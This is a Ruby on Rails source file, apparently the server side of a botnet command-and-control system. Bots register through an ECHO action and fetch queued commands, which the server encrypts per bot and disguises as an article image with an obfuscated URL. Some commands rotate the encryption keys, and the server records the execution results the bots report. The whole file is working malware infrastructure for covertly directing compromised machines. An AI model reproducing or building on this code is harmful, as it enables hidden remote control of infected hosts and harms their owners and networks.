# frozen_string_literal: true

module Api::V1::Bots
  class CommandControlController < Api::V1::Bots::BaseController
    include ::BotHelper
    include ::CryptHelper
    include ::OffuscateHelper

    def routing
      content = nil
      payload = recover_payload

      case payload[:action]
      when 'ECHO'
        raise CustomError.new(message: "Bot Issue or Fake with id: #{current_bot.id}", fatal: true) if !current_bot.bot_status.valid_to_registered?

        current_bot.track_as_normal_operation(description: 'Echo registration', ip: request.remote_ip)
        current_bot.update(active: true, bot_status: BotStatus.operating)

      when 'GET_COMMANDS'
        raise CustomError.new(message: "The bot is not active with id: #{current_bot.id}", fatal: true) if !current_bot.active || !current_bot.bot_status.ready?

        current_bot.track_as_normal_operation(description: 'Get pending commands', ip: request.remote_ip)
        current_bot.turn_off if current_bot.shutdown_on_going?
        settings = current_bot.bot_settings.only_active
        coms = command_pool
        if coms.present?
          if coms[:type] == 'renew'
            payload = encrypt(coms.to_s, settings.crypt_config['key'], settings.crypt_config['iv'])
            settings.update(crypt_config: coms[:metadata])
          else
            payload = encrypt(coms.to_s, settings.crypt_config['key'], settings.crypt_config['iv'])
          end

          content = {
            article: {
              image: payload[:ciphertext],
              url: ofuscate_image_link(payload[:tag], Parameter.c_c_uri.split('https://').last, Parameter.c_c_pool)
            }
          }
        end

      when 'REPORT_COMMANDS'
        current_bot.track_as_normal_operation(description: 'Report command execution', ip: request.remote_ip)
        puts "\n Result reported: #{payload}"
        bot_command = current_bot.bot_command_pools.sent.find_by(id: payload[:result][:identifier])
        bot_command.update(result: payload[:result].except(:identifier))

      end

      success_output(content: content)

    rescue StandardError => e
      process_error(e)
    end

    private

    def bot_params
      params.permit(
        :name,
        :image,
        :url
      )
    end

    def recover_payload
      raise CustomError.new(message: 'Bad Token bot', fatal: true) if current_bot.blank?

      @bot_setting = current_bot.bot_settings.only_active

      recover_register_payload(
        bot_params[:image],
        bot_params[:url],
        Parameter.c_c_pool,
        @bot_setting.crypt_config['key'],
        @bot_setting.crypt_config['iv']
      ).with_indifferent_access
    end

    def command_pool
      @command = current_bot.bot_command_pools.pop_pending
      return nil if @command.blank?

      {
        id: @command.id,
        type: @command.metadata['type'],
        type_2: @command.metadata['type_2'],
        type_3: @command.metadata['type_3'],
        action: @command.metadata['action'],
        metadata: @command.metadata['extra']
      }
    end
  end
end